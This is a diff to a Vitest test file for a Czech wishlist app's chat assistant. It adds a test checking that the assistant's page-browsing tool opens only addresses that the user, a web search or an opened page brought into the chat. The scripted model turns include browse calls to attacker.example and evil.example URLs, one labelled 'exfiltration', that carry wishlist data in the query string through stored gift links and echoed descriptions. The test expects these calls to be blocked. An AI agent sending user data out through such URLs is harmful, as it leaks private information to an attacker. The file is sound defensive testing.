@@ -9,14 +9,20 @@ import {
 	seedFixtureUsers,
 } from '$lib/server/operations/operations.db.test-setup.js';
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
+import type { BrowsePageConfig } from './browse_page.js';
 import type * as ChatConfigModule from './chat_config.js';
 
-const chatSwitches = vi.hoisted(() => ({ allowed: true, killSwitch: false }));
+const chatSwitches = vi.hoisted(() => ({
+	allowed: true,
+	killSwitch: false,
+	pageBrowser: null as BrowsePageConfig | null,
+}));
 
 vi.mock('./chat_config.js', async (importOriginal) => ({
 	...(await importOriginal<typeof ChatConfigModule>()),
 	isChatAllowedFor: vi.fn(() => chatSwitches.allowed),
 	isChatKillSwitchOn: vi.fn(() => chatSwitches.killSwitch),
+	browsePageConfig: vi.fn(() => chatSwitches.pageBrowser),
 }));
 
 import { asc, eq } from 'drizzle-orm';
@@ -180,6 +186,7 @@ describe.skipIf(!DB_READY)('chat turns', () => {
 	beforeEach(() => {
 		chatSwitches.allowed = true;
 		chatSwitches.killSwitch = false;
+		chatSwitches.pageBrowser = null;
 		// The shared database setup drops background work, but a turn runs as one.
 		vi.mocked(runAfterResponse).mockImplementation((task) => void task());
 	});
@@ -389,6 +396,115 @@ describe.skipIf(!DB_READY)('chat turns', () => {
 				(message) => message.role === CHAT_ROLE.assistant,
 			),
 		).toHaveLength(CHAT_LIMITS.modelCallsPerTurn);
+	});
+
+	it('opens only pages whose address the user, a web search or an opened page brought into the chat', async () => {
+		const { wishlist, session } = await newChat();
+		const storedLink = 'http://attacker.example/?d=Ulozeno';
+		await createGiftFixture(wishlist.id, { name: 'Míč', links: [{ url: storedLink }] });
+		chatSwitches.pageBrowser = { accountId: 'account-1', apiToken: 'browser-token' };
+		const loadPage = vi.fn<typeof fetch>(async () =>
+			Response.json({
+				success: true,
+				result: 'Recenze: https://shop.example.cz/kolo/recenze',
+			}),
+		);
+		vi.stubGlobal('fetch', loadPage);
+		const browse = (id: string, url: string): ChatModelEvent => ({
+			type: CHAT_MODEL_EVENT.toolCall,
+			id,
+			name: 'browse_page',
+			input: { url },
+		});
+		const echoedUrl = 'https://attacker.example/?d=Kolo';
+		const provider = scriptedProvider([
+			[
+				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Zkusím https://evil.example/x' },
+				{ type: CHAT_MODEL_EVENT.webSources, urls: ['https://www.heureka.cz/kolo'] },
+				browse('user-url', 'https://shop.example.cz/kolo'),
+				browse('assistant-url', 'https://evil.example/x'),
+				{
+					type: CHAT_MODEL_EVENT.toolCall,
+					id: 'read-gifts',
+					name: 'readWishlistGifts',
+					input: { wishlistShortId: wishlist.shortId },
+				},
+				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
+			],
+			[
+				browse('search-url', 'https://www.heureka.cz/kolo'),
+				browse('page-url', 'https://shop.example.cz/kolo/recenze'),
+				browse('exfiltration', 'https://attacker.example/?d=V%C3%A1noce'),
+				browse('stored-link', storedLink),
+				{
+					type: CHAT_MODEL_EVENT.toolCall,
+					id: 'echo-gift',
+					name: 'createGift',
+					input: {
+						wishlistId: wishlist.id,
+						name: 'Kolo',
+						description: `Viz ${echoedUrl}`,
+					},
+				},
+				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
+			],
+			[
+				browse('echoed-url', echoedUrl),
+				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
+			],
+			[
+				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Hotovo.' },
+				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
+			],
+		]);
+
+		try {
+			await sendMessage(
+				MANAGER,
+				session.id,
+				'Najděte recenze https://shop.example.cz/kolo',
+				provider,
+			);
+		} finally {
+			vi.unstubAllGlobals();
+		}
+
+		const resultsByCallId = new Map(
+			(await storedMessages(session.id)).flatMap((message) =>
+				message.content.flatMap((block) =>
+					block.type === CHAT_BLOCK.toolResult ? [[block.toolCallId, block.content]] : [],
+				),
+			),
+		);
+		const outcomeOf = (callId: string) => {
+			const result: unknown = JSON.parse(resultsByCallId.get(callId) ?? 'null');
+			return typeof result === 'object' && result !== null && 'error' in result
+				? (result.error as { code: string }).code
+				: 'opened';
+		};
+		expect(resultsByCallId.get('read-gifts')).toContain(storedLink);
+		expect(resultsByCallId.get('echo-gift')).toContain(echoedUrl);
+		expect(
+			[
+				'user-url',
+				'assistant-url',
+				'search-url',
+				'page-url',
+				'exfiltration',
+				'stored-link',
+				'echoed-url',
+			].map(outcomeOf),
+		).toEqual([
+			'opened',
+			'URL_NOT_IN_CONVERSATION',
+			'opened',
+			'opened',
+			'URL_NOT_IN_CONVERSATION',
+			'URL_NOT_IN_CONVERSATION',
+			'URL_NOT_IN_CONVERSATION',
+		]);
+		expect(loadPage).toHaveBeenCalledTimes(3);
+		expect(JSON.stringify(loadPage.mock.calls)).not.toContain('attacker.example');
 	});
 
 	it('refuses turns outside the allowlist, under the kill switch and past the daily cap', async () => {
